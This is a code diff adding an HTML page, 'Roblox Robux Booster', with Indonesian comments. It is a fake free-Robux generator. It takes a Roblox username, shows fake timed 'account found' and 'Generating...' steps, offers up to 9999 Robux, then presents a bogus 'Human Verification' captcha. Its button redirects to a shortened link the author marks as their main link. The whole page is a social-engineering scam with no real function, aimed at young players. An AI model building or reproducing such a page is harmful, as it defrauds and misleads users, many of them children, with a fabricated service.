@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Robux Booster</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700;900&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="styles.css"> 
+    <style>
+        /* Sembunyikan Step 2 secara default */
+        #step-2 { display: none; }
+    </style>
+</head>
+<body>
+    <div class="background-pattern"></div>
+    <div class="card">
+        <div class="roblox-logo-container">
+            <h1 class="roblox-logo">ROBLOX</h1>
+        </div>
+        
+        <div id="step-1">
+
+            <form id="step1Form">
+                <label for="username" class="label">USERNAME:</label>
+                <div class="input-group">
+                    <img src="https://i.ibb.co.com/CRq054H/user-12484547.png" alt="User Icon" class="input-icon-img">
+                    <input type="text" id="username" placeholder="Username" required>
+                </div>
+
+                <label class="label platform-label">YOUR PLATFORM</label>
+                <div class="platform-selection">
+                    <button type="button" class="platform-button selected" data-platform="windows">
+                        <img src="https://i.ibb.co.com/7txvyD2z/windows-732076.png" alt="Windows Icon" class="platform-icon-img">
+                    </button>
+                    <button type="button" class="platform-button" data-platform="xbox">
+                        <img src="https://i.ibb.co.com/b56DBVBd/xbox-logo-1321.png" alt="Xbox Icon" class="platform-icon-img">
+                    </button>
+                    <button type="button" class="platform-button" data-platform="android">
+                        <img src="https://i.ibb.co.com/h5LrqN9/android-logo-14415.png" alt="Android Icon" class="platform-icon-img">
+                    </button>
+                    <button type="button" class="platform-button" data-platform="apple">
+                        <img src="https://i.ibb.co.com/JWMzBtJz/social-12942302.png" alt="Apple Icon" class="platform-icon-img">
+                    </button>
+                </div>
+
+                <button type="submit" class="continue-button" id="continueBtn1">CONTINUE</button>
+
+                <div class="loading-container" id="loading1">
+                    <div class="spinner"></div>
+                    <p id="loadingText">Processing...</p>
+                </div>
+                
+                <p id="accountFound" class="notification-text" style="display:none; color: green; font-weight: bold;">
+                    Roblox account found!
+                </p>
+            </form>
+        </div>
+
+        <div id="step-2">
+            <h2 class="select-text">Select the amount of Robux</h2>
+
+            <form id="step2Form">
+                <button type="button" class="roblox-button robux-option selected" data-amount="1000">
+                    <img src="https://i.ibb.co.com/SXP1X1Mm/robux-2019-removebg-preview.png" alt="Robux Icon" class="robux-icon-img"> 1000 Robux
+                </button>
+                <button type="button" class="roblox-button robux-option" data-amount="2500">
+                    <img src="https://i.ibb.co.com/SXP1X1Mm/robux-2019-removebg-preview.png" alt="Robux Icon" class="robux-icon-img"> 2500 Robux
+                </button>
+                <button type="button" class="roblox-button robux-option" data-amount="5000">
+                    <img src="https://i.ibb.co.com/SXP1X1Mm/robux-2019-removebg-preview.png" alt="Robux Icon" class="robux-icon-img"> 5000 Robux
+                </button>
+                <button type="button" class="roblox-button robux-option" data-amount="9999">
+                    <img src="https://i.ibb.co.com/SXP1X1Mm/robux-2019-removebg-preview.png" alt="Robux Icon" class="robux-icon-img"> 9999 Robux
+                </button>
+
+                <button type="submit" class="continue-button" id="continueBtn2">CONTINUE</button>
+
+                <div class="loading-container" id="loading2">
+                    <div class="spinner"></div>
+                    <p id="loadingText2">Generating...</p>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="captchaModal" class="modal">
+        <div class="modal-content">
+            <h3>Human Verification Required!</h3>
+            <p>To receive your Robux, you must complete a quick **Human Verification** step.</p>
+            <p>Click the button below to complete the Captcha.</p>
+            <button id="verifyButton" class="continue-button" style="margin-top: 20px;">
+                COMPLETE CAPTCHA
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const step1Form = document.getElementById('step1Form');
+        const continueBtn1 = document.getElementById('continueBtn1');
+        const loading1 = document.getElementById('loading1'); 
+        const accountFound = document.getElementById('accountFound'); 
+        const step2Form = document.getElementById('step2Form');
+        const continueBtn2 = document.getElementById('continueBtn2'); 
+        const loading2 = document.getElementById('loading2'); 
+        const platformButtons = document.querySelectorAll('.platform-button'); // Ambil tombol platform
+        const robuxButtons = document.querySelectorAll('.robux-option');
+        const modal = document.getElementById('captchaModal');
+        const verifyButton = document.getElementById('verifyButton');
+        
+        // ==========================================================
+        // !!! LOKASI LINK UTAMA ANDA !!!
+        const mainLink = "https://rb.gy/rgcdh4"; 
+        // ==========================================================
+
+        // --- Platform Button Logic ---
+        platformButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                platformButtons.forEach(btn => btn.classList.remove('selected'));
+                button.classList.add('selected');
+            });
+        });
+
+        // --- STEP 1 LOGIC: Pindah ke Step 2 dengan Loading dan Notifikasi ---
+        step1Form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            accountFound.style.display = 'none';
+            continueBtn1.style.display = 'none';
+            loading1.style.display = 'flex'; 
+
+            setTimeout(() => {
+                loading1.style.display = 'none';
+                accountFound.style.display = 'block';
+
+                setTimeout(() => {
+                    step1.style.display = 'none';
+                    step2.style.display = 'block';
+                    accountFound.style.display = 'none'; 
+                    document.querySelector('.card').scrollIntoView({ behavior: 'smooth' });
+                }, 500);
+
+            }, 1500); 
+        });
+
+        // --- STEP 2 LOGIC: Pemilihan Robux ---
+        robuxButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                robuxButtons.forEach(btn => btn.classList.remove('selected'));
+                button.classList.add('selected');
+            });
+        });
+
+        // --- STEP 2 LOGIC: Tampilkan Captcha Modal dengan Loading ---
+        step2Form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            continueBtn2.style.display = 'none';
+            loading2.style.display = 'flex'; 
+            
+            setTimeout(() => {
+                loading2.style.display = 'none';
+                continueBtn2.style.display = 'block'; 
+                modal.style.display = 'flex'; 
+            }, 1500);
+        });
+
+        // --- MODAL LOGIC: Redirect ---
+        verifyButton.addEventListener('click', () => {
+            window.location.href = mainLink; 
+        });
+
+        // Menutup modal jika klik di luar
+        window.addEventListener('click', (event) => {
+            if (event.target == modal) {
+                modal.style.display = 'none';
+                continueBtn2.style.display = 'block'; 
+                loading2.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
